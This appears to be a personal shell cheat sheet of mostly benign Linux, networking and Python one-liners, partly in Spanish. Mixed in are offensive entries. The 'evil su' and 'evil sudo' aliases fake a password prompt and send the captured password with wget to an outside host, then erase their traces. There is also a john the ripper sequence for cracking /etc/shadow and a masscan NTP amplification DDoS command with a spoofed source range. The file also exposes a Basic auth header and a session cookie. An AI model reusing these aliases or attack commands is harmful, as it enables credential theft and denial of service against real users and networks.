##### # how old days you are:  $ echo $(( $(( $( date +%s ) - $( date -d "1979-03-26" +%s ) )) / 86400 ))
##### # get epoch time:
##### #  $ date +%s
##### #  $ perl -e 'printf "%d\n", time()'
##### #  $ python2 -c 'import time; print "%d\n" % time.time();'
##### #  $ python3 -c 'import time; print("%d\n" % (time.time()));'
##### #  $ echo | awk '{print srand()}'
##### #  $ echo | nawk '{print srand()}'
##### #
##### # john the ripper:
##### #  unshadow /etc/passwd /etc/shadow > /var/tmp/mypasswd
##### #  john /var/tmp/mypasswd
##### #  # ls -l ~/.john/john.pot
##### #  # head -10 ~/.john/john.log
##### #  # john --show /var/tmp/mypasswd
##### #  # john --show --users=0 /var/tmp/mypasswd
##### #  # john --show --groups=0,1 /var/tmp/mypasswd
##### #  # john --wordlist=diccionario.lst --rules /var/tmp/mypasswd
##### #  # john --status
##### #  # john --incremental /var/tmp/mypasswd
##### # convertir de formato dos a unix (^M): dos2unix
##### # show non printable characteres: cat -A file
##### # pass bash variables to awk:   $ LIMITE=500; awk '{print $1}' test.txt | awk -v limite="$LIMITE" '$1>limite'
##### # spoof referer: curl -e "http://www.google.com" http://www.ignaciocano.com/tools/headers.php
##### # /usr/bin/wget --keep-session-cookies --base http://legendas.tv --user-agent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" --referer http://legendas.tv --save-cookies=/home/torrents/.flexget/login.txt --post-data="&a=post&txtLogin=$LOGIN&txtSenha=$PASSWORD&chkLogin=1" http://legendas.tv/login_verificar.php -O /dev/null &> /dev/null
##### # update bittorrent ip block list: wget -O - http://list.iblocklist.com/\?list\=ydxerpxkpcfqjaybcssw\&fileformat\=p2p\&archiveformat\=gz | gunzip > ~/ipfilter.p2p
##### # get web status code:   $ curl --write-out %{http_code} --silent --output /dev/null localhost  || curl -s -o /dev/null -w "%{http_code}\n" localhost
##### # get elapsed time since process was started:   $ ps -eo pid,comm,args,user,etime --sort user | more
##### # create initrd:   cd tmp ; find . |cpio -o -H newc| gzip > ../initrd.gz
##### # extract initrd:   $ mkdir tmp ; cd tmp ; zcat ../initrd.gz | cpio -i
##### # reactivate ctrl+alt+backspace to resstart Xserver:   sudo dpkg-reconfigure keyboard-configuration  # reconfigure preferences in /etc/default/keyboard
##### # mount options, access/change/modified time:  # noatime (dirs and files), nodiratime (dirs), relatime (only updates atime if older than mtime/ctime)
##### # pmount /dev/sdb1  # to mount usb with non-root privileges
##### # TB writeen:   $ sudo smartctl -a /dev/sda |grep Writ |awk '{print $NF/2/1024/1024/1024 " TeraBytes Written"}'  #5.98285 TeraBytes Written
##### # null a file with sudo:  $ sudo bash -c "> /var/log/httpd/access_log"
##### # random pirate bay proxy:   url=`curl http://proxybay.info/ | awk -F'href="|" |">|</' '{for(i=2;i<=NF;i=i+4) print $i,$(i+2)}' | grep follow|sed 's/^.\{19\}//'|shuf -n 1`
##### # set sticky bit (borrado restringido al propietario): chmod +t /tmp
##### # chmod all except some files: chmod 700 archivos/!(file.txt|tesis.doc)
##### # graph.facebook.com/alias > get de ID and then facebook.com/<id>
##### # tts:
##### #  echo hola | espeak -ves  || espeak --voices
##### #  festival --language spanish --tts file.txt  || api festvox-ellpc11k
##### #  echo $1|iconv -f utf-8 -t iso-8859-1|festival --tts --language spanish
##### #    wget http://forja.guadalinex.org/frs/download.php/154/festvox-sflpc16k_1.0-1_all.deb
##### #
##### # analyze ddos attack:
##### #  peticiones por ip: tail -f /var/log/nginx/nginx.access.log | cut -d ' ' -f 1 | logtop
##### #  peticiones de un "string" por ip:   grep "&key=" /var/log/nginx/nginx.access.log | cut -d ' ' -f 1 | sort | uniq -c | sort -n | tail -n 30
##### #  https://ctf365.com/pages/map
##### #  http://map.ipviking.com/
##### #  http://www.digitalattackmap.com/
##### #  http://www.akamai.com/html/technology/dataviz1.html
##### # check what options used when compiling source code with ./configure:  ./config.status --config
##### # check certificate date:
##### #   openssl x509 -in systemadmin.es.crt -noout -dates
##### #  echo | openssl s_client -connect 1.2.3.4:443 2>/dev/null | openssl x509 -noout -dates
##### # check certificate info (subject):
##### #  echo | openssl s_client -host croscat.systemadmin.es -port 8140 2>/dev/null| openssl x509 -noout -subject
##### # avoid restart services after updates: create file: /usr/sbin/policy-rc.d:
##### #  #/bin/sh
##### #  exit 101
##### # evil su
##### # http://www.elladodelmal.com/2014/10/ataques-gnulinux-con-alias-maliciosos.html
##### #
##### #  alias su=' echo -n "Contraseña: " ; read -s PASS1 ; wget --background --quiet --output-document=$HOME/.local/.wine32 "blogx86.net/aliasliado.php?victima=HackConcept&clave=$PASS1" > /dev/null ; echo "" ; sleep 3 ; echo "su: Fallo de autenticación" ; unalias su >> /dev/null 2>&1 ; unset PASS1 ; rm -f $HOME/.local/.wine32 > /dev/null 2>&1 ; sed -e "/^alias su/d" ~/.bashrc > .temporal ; mv .temporal ~/.bashrc '
##### #
##### #
##### #  $ php -S 127.0.0.1:8080
##### #  alias su=' echo -n "Contraseña: "; read -s PASS1; wget --background --quiet --output-document=$HOME/.local/.$$ "127.0.0.1:8080/?u=$USER&P=$PASS1" > /dev/null ; echo "" ; sleep 3 ; echo "su: Fallo de autenticación" ; unalias su >/dev/null 2>&1 ; unset PASS1 ; rm -f $HOME/.local/.$$ >/dev/null 2>&1'
##### #
##### # evil sudo
##### #
##### #  alias sudo=' echo -n "[sudo] password for $(whoami): " ; read -s PASS1 ; wget --background --quiet --output-document=$HOME/.local/.wine32 "blogx86.net/aliasliado.php?victima=HackConcept&clave=$PASS1" > /dev/null ; echo "" ; sleep 3 ; echo "Lo sentimos, vuelva a intentarlo." ; unalias sudo >> /dev/null 2>&1 ; unset PASS1 ; rm -f $HOME/.local/.wine32 > /dev/null 2>&1 ; sed -e "/^alias su/d" ~/.bashrc > .temporal ; mv .temporal ~/.bashrc ; sudo $1 $2 $3 $4 $5 $6 $7'
##### #
##### #  alias sudo=' echo -n "[sudo] password for $USER: "; read -s PASS1; wget --background --quiet --output-document=$HOME/.local/.$$ "127.0.0.1:8080/?q=$USER:$PASS1" >/dev/null; echo ""; sleep 3; echo "Lo sentimos, vuelva a intentarlo."; unalias sudo >/dev/null 2>&1; unset PASS1; rm -f $HOME/.local/.$$ >/dev/null 2>&1; sudo $@'
##### # backlight from the command line
##### #  ls /sys/class/backlight/
##### #  ls /sys/class/backlight/radeon_bl0/
##### #  cat /sys/class/backlight/radeon_bl0/brightness
##### #  cat /sys/class/backlight/radeon_bl0/max_brightness
##### #  echo 4539 > /sys/class/backlight/intel_backlight/brightness
##### # listar contenido keystore:   # /opt/java/bin/keytool -list -keystore cert.keystore
##### # decompile java class file: $ javap -classpath . -c foo  # foo.class
##### # upper to lowercase:
##### #  $ tr '[:upper:]' '[:lower:]' < uppercase.txt > lowercase.txt
##### #  $ echo $UCASE | tr '[:upper:]' '[:lower:]'
##### #  $ awk '{print tolower($0)}' < uppercase.txt > lowercase.txt
##### #  $ dd if=uppercase.txt of=lowercase.txt conv=lcase
##### #  $ echo $UCASE | dd conv=lcase 2> /dev/null
##### #  $ sed -e 's/\(.*\)/\L\1/' uppercase.txt > lowercase.txt
##### #  $ sed -i -r 's/(.*)/\L&/' filename
##### #  $ echo ${UCASE,,}
##### # rename file to lowercase: rename 'y/A-Z/a-z/' *
##### # show even/odd lines:
##### #  $ sed '0~2d' file  # odd
##### #  $ sed '1~2d' file  # even
##### # profiling a process
##### #  ps -C thunderbird -L
##### #  sudo debuginfo install thunderbird # 2gb symbol
##### #  sudo perf top -g -p $(pidof thunderbird)
##### #  stop thunderbird
##### # see what's going on with a process:
##### #  ps -o pid,wchan 12970 # <pid>
##### # generate phone keyboard:  echo {1..9} '* 0 #' | tr ' ' '\n' |paste - - -  || printf "%s\t%s\t%s\n" {1..9} '*' 0 '#'
##### # cronómetro/stopwath: time read  # (ctrl-d to stop)
##### # CDPATH=:..:~:~/projects  # para que cd busque en esos directorios
##### # remove duplicate lines without sorting:
##### #  awk '!x[$0]++' filename
##### #   awk '!NF || !seen[$0]++'
##### # remove duplicate files:
##### #  fdupes -rd .  # promps each file
##### #  fduples -rdN . # preserves the first of each group and deletes the others w/o prompting
##### # ver los argumentos autocompletados:  echo <ESC> *
##### # show ram contents:  sudo dd if=/dev/mem | cat | strings
##### # editando de forma segura:  visudo, vipw, vipw -s, pwconv, vigr, grpconv, pwck
##### # cambiar la zona horaria (timezone): cp /usr/share/zoneinfo/Europe/Madrid /etc/localtime
##### # laberinto (labyrinth): while ( true ) ; do if [ $(expr $RANDOM % 2 ) -eq 0 ] ; then echo -ne "\xE2\x95\xB1" ; else echo -ne "\xE2\x95\xB2" ; fi ; done
##### # json to yaml: python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdout, allow_unicode=True)' < foo.json > foo.yaml
##### # update ubuntu: sudo update-manager -d  || sudo do-release-upgrade
##### # trap 'v=$((! v));' SIGUSR1 # Then do kill -USR1 PIDOFBASH to flip the state of the variable v
##### # check if djago migrations clashes:
##### #  find . -type f -name "*.py" | grep -o ".*/migrations/[0-9]\+" | sort | uniq -c | awk '$$1 > 1 {print $$0}'
##### # redirec streaming over the net
##### #  terminalA $ ls -l /dev/video* # has video recording devices
##### #  terminalA $ cat /dev/video0 | nc -l -p 9998
##### #   terminalB $ nc terminalA 9998 | mplayer -vo x11 -cache 2000 -
##### # redirect streaming over the net optimized
##### #  terminalA $ cat /dev/video0 | ./ffmpegfilter.sh - | nc -l -p 9998
##### # redirect and save a copy
##### #  terminalA $ cat /dev/video0 | tee save.mpeg | ./ffmpegfilter.sh - | nc -l -p 9998
##### # habilitar bash_completion (api bash_completion):
##### #  sed -i '/#if ! shopt.*$/,+6s/#//' /etc/bash.bashrc
##### # habilitar cd automático: shopt -s autocd (put in in ~/.bashrc). ex: $ /etc === cd /etc
##### # amplified ddos:
##### #  http://blog.erratasec.com/2015/01/anybody-can-take-north-korea-offline.html
##### #  NK IP, list of amplifiers
##### #  masscan --source-ip 175.45.176.0/22 -iL amplifiers.txt --nmap-payloads monlist.txt -pU:123 --rate 1000000 --infinite
##### # ftp mirror:
##### #  lftp -c "set ftp:list-options -a;
##### #  open 'ftp://user:pass@example.com';
##### #  cd "/www";
##### #  lcd "/home/user/ftp";
##### #  mirror --verbose"
##### # hd performance with hdparm:
##### #  fastest bandiwth: sudo hdparm -I /dev/sda | grep -i speed
##### #  current bandwith: sudo hdparm -I /dev/sda | grep -i speed
##### #  info: sudo hdparm -I /dev/sda
##### # network configuration
##### #  secondary ip (legacy):
##### #    auto eth0
##### #    allow-hotplug eth0
##### #    iface eth0 inet static
##### #      address ...
##### #      netmask ...
##### #      gateway
##### #    iface eth0:0 inet static
##### #      address xxx.xxx.xxx.xxx
##### #            netmask xxx.xxx.xxx.xxx
##### #    iface eth0:1 inet static
##### #      address xxx.xxx.xxx.xxx
##### #            netmask xxx.xxx.xxx.xxx
##### #  secondary ip (iproute2):
##### #    auto eth0
##### #    allow-hotplug eth0
##### #    iface eth0 inet static
##### #        address 192.168.1.42
##### #        netmask 255.255.255.0
##### #        gateway 192.168.1.1
##### #    iface eth0 inet static
##### #        address 192.168.1.43
##### #        netmask 255.255.255.0
##### #    iface eth0 inet static
##### #        address 192.168.1.44
##### #        netmask 255.255.255.0
##### #    iface eth0 inet static # adding ips from subnet
##### #        address 10.10.10.14
##### #        netmask 255.255.255.0
##### #  manual
##### #    auto eth0
##### #    allow-hotplug eth0
##### #    iface eth0 inet static
##### #        address 192.168.1.42
##### #        netmask 255.255.255.0
##### #        gateway 192.168.1.1
##### #        up   ip addr add 192.168.1.43/24 dev $IFACE label $IFACE:0
##### #        down ip addr del 192.168.1.43/24 dev $IFACE label $IFACE:0
##### #        up   ip addr add 192.168.1.44/24 dev $IFACE label $IFACE:1
##### #        down ip addr del 192.168.1.44/24 dev $IFACE label $IFACE:1
##### #  interface without ip
##### #    iface eth0 inet manual
##### #      pre-up ifconfig $IFACE up
##### #      post-down ifconfig $IFACE down
##### #  set eth0 promiscuous mode: $ sudo ifconfig eth0 promisc || ifconfig to check it out
##### #  unset eth0 promiscuous mode: $ sudo ifconfig eth0 -promisc
##### # kick off user: who && pkill -9 -t tty8
##### # block/unblock user: passwd -l pepe || passwd -v pepe 
##### # update alternatives. ej mawk instead of awk (by default, gawk): sudo update-alternatives --config awk
##### # firefox history: sqlite3 ~/.mozilla/firefox/*.[dD]efault/places.sqlite "SELECT strftime('%d.%m.%Y %H:%M:%S', visit_date/1000000, 'unixepoch', 'localtime'),url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER BY visit_date;"
##### # firefox bookmarks: sqlite3 ~/.mozilla/firefox/*.[dD]efault/places.sqlite "SELECT strftime('%d.%m.%Y %H:%M:%S', dateAdded/1000000, 'unixepoch', 'localtime'),url FROM moz_places, moz_bookmarks WHERE moz_places.id = moz_bookmarks.fk ORDER BY dateAdded;"
##### # count files by modification month:  find . -maxdepth 1 -type f -printf '%TY-%Tm\n' | sort | uniq -c
##### # kodi (raspberry pi, raspbmc): restart from commandline:   $ sudo initctl restart kodi
##### # check raspberry pi (rpi) temperature:
##### #  $ cat /sys/class/thermal/thermal_zone0/temp
##### #  $ /opt/vc/bin/vcgencmd measure_temp
##### # escape bash varibles:  printf "%q" $var
##### # roll dice:
##### #  http://www.fileformat.info/info/unicode/char/search.htm?q=%E2%9A%80&preview=entity
##### #  http://www.amp-what.com/unicode/search/%E2%9A%80
##### #  perl6 -e 'for ^6 { say ("¿".."¿").roll(3) }'
##### # emoji 8-ball: how am i going to die?
##### #  em8ball(){ a=$( printf "%x\n" $(($RANDOM%368+9728)) );printf "\u$a ";random -e 2 && $FUNCNAME||echo; } # emojic8ball how will I die? #xkcd
##### # special chars: 
##### #  0x1f691 = ambulancia
##### # dashes:
##### #   ¿ figure dash &#8210;
##### #   ¿ en dash &ndash;
##### #   ¿ em dash &mdash;
##### #   - hyphen¿minus The key next to the zero on keyboard
##### #   ¿ hyphen &#8208;
##### #   ¿ non¿breaking hyphen &#8209;
##### #   ¿ minus sign &minus;
##### #   ¿ horizontal bar &#8213; soft hyphen &shy;
##### # postgresql
##### #  copy row before delete: \copy ( select * from $table where id in ( ... ) ) to '/tmp/backup.csv'
##### #  restore row: \copy $table from '/tmp/backup.csv'
##### # fwknop, generate client configuration: $ fwknop -A tcp/9091 -D terminus.ignaciocano.com --key-gen --use-hmac --save-rc-stanza
##### # python:
##### #  print file location of a module: >>> print inspect.getfile(urllib2)  # import inspect, urllib2
##### #  difference between lists: set(list_a).symmetric_difference(list_b)
##### #  url parameter encoding to dict: dict(x.split("=") for x in str_urlenc.split("&"))
##### #  set enumeration begin: >>> list(enumerate('abc', 1))
##### #  dict/set comprehensions: my_dict = {i: i * i for i in xrange(100)} || my_set = {i * 15 for i in xrange(100)}
##### #  from __future__ import division || 1/2 == 0.5
##### #  evaluate python expression: my_list = ast.literal_eval(expr)
##### #  "case" with dictionary mapping: d = { "a": 0 }; d.get(key, default)
##### # python logging:
##### #  import logging
##### #  logging = logging.getLogger(__name__)
##### #  logger.info("%s went %s wrong", 42, 'very')
##### #  # logger.info("{} went {} wrong".format(42, 'very'))    # don't (string gets created even if not logged)
##### #  # logger.info("%s went %s wrong" % (42, 'very'))  # don't (string gets created even if not logged)
##### # python namedtupples:
##### #  from collections import namedtuple
##### #  Animal = namedtuple('Animal', 'name age type')
##### #  perry = Animal(name="perry", age=31, type="cat")
##### #  print(perry)
##### #  # Output: Animal(name='perry', age=31, type='cat')
##### #  print(perry.name)
##### #  # Output: 'perry'
##### #  perry.age = 42
##### #  # Output: Traceback (most recent call last):
##### #  #            File "<stdin>", line 1, in <module>
##### #  #         AttributeError: can't set attribute
##### #  print(perry[0])
##### #  # Output: perry
##### #  perry._asdict()
##### #  # Output: OrderedDict([('name', 'perry'), 
##### #  # ('age', 31), ('type', 'cat')])
##### # guitar notes: n=('' E4 B3 G3 D3 A2 E2);while read -n1 -p 'string? ' i;do case $i in [1-6]) play -n synth pl ${n[$i]} fade 0 1 ;; *) echo;break;;esac;done
##### # crs with multipledomains:
##### #  create private key: openssl genrsa -out privkey.pem 2048
##### #   define alternate names:
##### #    openssl req -new -key privkey.pem -sha256 -nodes \
##### #    -subj '/C=ES/ST=Barcelona/L=Barcelona/O=systemadmin/OU=/CN=systemadmin.es/emailAddress=/
##### #          subjectAltName=DNS.1=www.systemadmin.es, DNS.2=qapla.systemadmin.es' > systemadmin.csr
##### #  check csr: openssl req -in systemadmin.csr -noout -subject
##### # create jar: jar cvf
##### # extract jar: jar xvf
##### # create recursive zip file with filtering: $ find . -name django.po -print | zip source -@
##### # create recursive tgz file with filtering: find . -name django.po -print | xargs tar cf - | gzip -c > findfile.tgz
##### # backup mail from one mail server to another:
##### #   imapsync \
##### #   --tls1 --host1 x.x.x.x --user1 $usuario --password1 $password \
##### #   --tls2 --host2 y.y.y.y --user2 $usuario --password2 $password \
##### #   --delete2duplicates
##### # check if web accepts gzip: 
##### #  curl -u karpoke --compressed -kI https://terminus.dyn.ignaciocano.com  # response should include Content-Encoding: gzip
##### #  curl -u karpoke -H "Accept-Encoding: gzip" -kI https://terminus.dyn.ignaciocano.com  # response should include Content-Encoding: gzip
##### #  http://checkgzipcompression.com/?url=http://terminus.ignaciocano.com
##### # download unread articles from wallabag:
##### #  curl 'https://wallabag.dyn.ignaciocano.com/?mobi&method=all' -H 'Authorization: Basic a2FycG9rZTpva2UyNC0=' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Language: es-ES,es;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/41.0.2272.76 Chrome/41.0.2272.76 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Referer: https://wallabag.dyn.ignaciocano.com/?view=config' -H 'Cookie: wallabag=1di9egt67h62ekar2mftaamrd1' -H 'Connection: keep-alive' --compressed -k -s -o all.mobi
##### # allow sudo to "known" about aliases: alias sudo="sudo "  # leave a trailing blank space 
##### # disable wordwrap: tput rmam  (enable again with tput smam)
##### # du with bars and colors:
##### #  du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t*c+.5); b="\033[1;31m"; for (i=0; i<r; i++) b=b"#"; printf " %5.2f%% %s\033[0m %s\n", $1/t*100, b, $2}'|tac
##### # mirror update packages
##### #  debmirror --debug \
##### #  --progress \
##### #  --verbose \
##### #  --diff=none \
##### #  --host=ftp.uk.debian.org \
##### #  --root=debian \
##### #  --method=http \
##### #  --dist=jessie-updates \
##### #  --arch=i386,amd64 \
##### #  --nosource \
##### #  --section=main,contrib,non-free \
##### #  --progress \
##### #  --verbose \
##### #  --diff=none \
##### #  --host=security.debian.org \
##### #  --root=debian-security \
##### #  --method=http \
##### #  --dist=jessie/updates \
##### #  --arch=i386,amd64 \
##### #  --nosource \
##### #  --section=main,contrib,non-free \
##### #  --getcontents \
##### #  --exclude='-dbg_' \
##### #  --ignore-release-gpg \
##### #  --ignore-missing-release \
##### #  --rsync-extra=none \
##### #  /var/www/jessie/security
##### # MRU (most recent used files):
##### #  kde:
##### #    $HOME/.kde/share/apps/RecentDocuments
##### #    $HOME/.kde/share/apps/kate/katerc
##### #    $HOME/.kde/share/apps/kate/metainfos
##### # trash mail:
##### #  http://10minutemail.com
##### #  http://boun.cr/
##### #  http://discard.email/
##### #  http://getairmail.com/
##### #  http://imgv.de/
##### #  http://instantemailaddress.com/
##### #  http://maildrop.cc/
##### #  http://mailnesia.com/
##### #  http://mailnull.com/
##### #  http://www.33mail.com/
##### #  http://www.dispostable.com/
##### #  http://www.fakemailgenerator.com/
##### #  http://www.guerrillamail.com/
##### #  http://www.mailforspam.com/
##### #  http://www.mailimate.com/
##### #  http://www.mailinator.com/
##### #  http://www.mintemail.com/
##### #  http://www.spamgourmet.com/
##### #  http://www.yopmail.com/es/
##### #  http://mail.wft/
##### # torrents:
##### #  http://1337x.to/
##### #  http://www.1337x.pl/
##### #  http://bitsnoop.com/
##### #  http://extratorrent.cc/
##### #  http://kickass.to/
##### #  http://rarbg.com/
##### #  https://eztv.ch/
##### #  http://todotorrents.com/
##### #  http://torrent-finder.info/
##### #  http://www.nyaa.se/
##### #  http://www.torrentreactor.net/
##### #  http://www.torrentz.eu/
##### #  http://www.yify-torrent.org
##### #  http://yts.to/
##### # torrent searcher:
##### #  http://bitsnoop.com/
##### #  http://metasearch.torrentproject.com/
##### #  https://getstrike.net/torrents/
##### #  https://torrentz.eu/
##### #  http://torrent-finder.info/
##### #  http://torrentproject.se/
##### # list of harmful domains:
##### #  http://adaway.org/hosts.txt
##### #  http://hosts-file.net/ad_servers.asp
##### #  http://pgl.yoyo.org/adservers/serverlist.php?hostformat=hosts&showintro=0&mimetype=plaintext
##### #  http://someonewhocares.org/hosts/hosts
##### #  https://raw.githubusercontent.com/jorgicio/publicidad-chile/master/hosts.txt
##### #  http://winhelp2002.mvps.org/hosts.txt
##### # relaxing music:
##### #  http://gahtan.ca/projects/chilltunes/home/
##### #  http://relaxinfinity.com/
##### #  http://relaxingbeats.com/
##### #  http://tistheseasonto.be/snowing/
##### #  http://www.jazzandrain.com/
##### #  http://www.stereomood.com/
##### # vpns:
##### #  https://hide.me
##### #  https://support.zenmate.com/hc/en-us
##### #  https://torvpn.com
##### #  https://www.privatetunnel.com
##### #  https://www.tunnelbear.com/
##### #  https://zenmate.com/
##### #  http://www.cyberghostvpn.com/en_us
##### # radios: (cvlc <url>  # vlc without gui interface)
##### #  http://rolandradio.net/listen/roland.128.mp3.stereo.pls  # amstrad cpc games music
##### # bitcoing exchange:
##### #  https://api.coindesk.com/v1/bpi/currentprice/usd.json
##### # crosswords:
##### #  regexp: https://regexcrossword.com
##### #  linux commands: http://www.nlognmag.com/2015/04/crossword-linux-commands/
##### # openwrt:
##### #  vr-3025u: http://wiki.openwrt.org/toh/comtrend/vr3025u
##### # opendns:
##### #  208.67.220.220, 208.67.222.222
##### #  check it: https://www.opendns.com/welcome/
##### # shortcuts:
##### #  en Windows 7 y superiores si pulsas simultáneamente las teclas control + 9 + 0 + 2 + 4 + backspace se abre un consola de sistema con privilegios de administración (SYSTEM)
##### # reduce swap use (when we have enough ram):
##### #   sudo gedit /etc/sysctl.conf
##### #   vm.swappiness=1
##### #   vm.vfscachepressure=50
##### #   vm.dirtywritebackcentisecs=1500
##### # symbol recognition
##### #   http://www.mausr.com/
##### # ppa grub-customizer
##### #   sudo add-apt-repository ppa:danielrichter2007/grub-customizer
##### #   sudo apt-get update
##### #   sudo apt-get install grub-customizer
